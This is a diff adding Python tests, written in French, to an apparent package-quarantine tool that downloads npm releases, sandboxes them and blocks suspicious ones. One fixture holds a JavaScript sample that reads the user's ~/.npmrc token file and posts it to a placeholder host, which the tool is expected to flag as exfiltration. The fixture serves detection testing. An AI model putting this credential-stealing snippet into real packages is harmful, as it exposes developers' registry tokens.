@@ -400,3 +400,61 @@ def test_une_panne_de_la_veille_pypi_n_empeche_pas_la_veille_rss(base, monkeypat
                         lambda base, maintenant, client, flux: vus.append("rss"))
     traitement._veiller_reseau(base, MAINTENANT)
     assert vus == ["rss"]
+
+
+# --- npm : le même parcours, avec le registre npm, l'analyse npm et le module tel quel ---------
+def _tgz(dossier: Path, nom: str, version: str, index_js: str) -> Path:
+    dossier.mkdir(parents=True, exist_ok=True)
+    chemin = dossier / f"{nom.split('/')[-1]}-{version}.tgz"
+    with tarfile.open(chemin, "w:gz") as t:
+        for f, texte in {"package.json": '{"name": "%s", "version": "%s"}' % (nom, version),
+                         "index.js": index_js}.items():
+            octets = texte.encode()
+            info = tarfile.TarInfo(f"package/{f}")
+            info.size = len(octets)
+            t.addfile(info, io.BytesIO(octets))
+    return chemin
+
+
+def test_une_version_npm_est_telechargee_du_registre_npm_et_analysee_en_npm(tmp_path,
+                                                                            monkeypatch):
+    base = Base(str(tmp_path / "sas.db"))
+    for nom in ("@org/mon-outil", "vole-npmrc"):
+        base.enregistrer_version(Version(ecosysteme=Ecosysteme.NPM, nom=nom, version="1.0.0",
+                                         publiee_le=MAINTENANT - timedelta(days=5),
+                                         detectee_le=MAINTENANT, etat=Etat.EN_ATTENTE))
+    codes = {"@org/mon-outil": "module.exports = 1;\n",
+             "vole-npmrc": "const t = require('fs').readFileSync(require('os').homedir()"
+                           " + '/.npmrc');\nfetch('https://x.invalid', {body: t});\n"}
+    telecharges, executes, publies = [], [], []
+
+    def faux_registre_npm(nom, version, dossier, *, client):
+        telecharges.append((nom, dossier))
+        return [_tgz(dossier, nom, version, codes[nom])]
+
+    monkeypatch.setattr(traitement.npm, "telecharger", faux_registre_npm)
+    monkeypatch.setattr(traitement.pypi, "telecharger", lambda *a, **k: pytest.fail("PyPI"))
+    traitement.traiter(
+        base, MAINTENANT, delai=timedelta(days=3), dossier=tmp_path / "archives",
+        executer=lambda eco, archive, module, duree_max_s=120: executes.append(
+            (eco, archive.name, module)) or VIDE,
+        publier=lambda eco, nom, version, archives, vid: publies.append((eco, nom)),
+        veiller=lambda b, m: None, controler_meta=lambda v, p, m: [],
+        llm=lambda *a: ResultatLLM())
+    # Les archives npm ont leur propre dossier : un « requests » npm ne croise pas celui de PyPI.
+    assert all(d.relative_to(tmp_path / "archives").parts[0] == "npm" for _, d in telecharges)
+    # Le module de la sandbox est le nom npm tel quel (require("@org/mon-outil")).
+    assert (Ecosysteme.NPM, "mon-outil-1.0.0.tgz", "@org/mon-outil") in executes
+    assert publies == [(Ecosysteme.NPM, "@org/mon-outil")]
+    fiche = base.fiche(Ecosysteme.NPM, "vole-npmrc", "1.0.0")
+    assert fiche.version.etat is Etat.BLOQUEE
+    assert "exfiltration" in {s.sorte for s in fiche.signaux}
+
+
+def test_la_version_precedente_npm_se_choisit_en_semver(tmp_path):
+    base = Base(str(tmp_path / "sas.db"))
+    for v, etat in (("1.9.0", Etat.PUBLIEE), ("1.10.0", Etat.PUBLIEE), ("1.11.0", Etat.EN_ATTENTE)):
+        base.enregistrer_version(Version(ecosysteme=Ecosysteme.NPM, nom="x", version=v,
+                                         publiee_le=MAINTENANT, detectee_le=MAINTENANT, etat=etat))
+    v = base.lire_version(Ecosysteme.NPM, "x", "1.11.0")
+    assert traitement._precedente(base, v) == "1.10.0"      # pas « 1.9.0 » (ordre du texte)
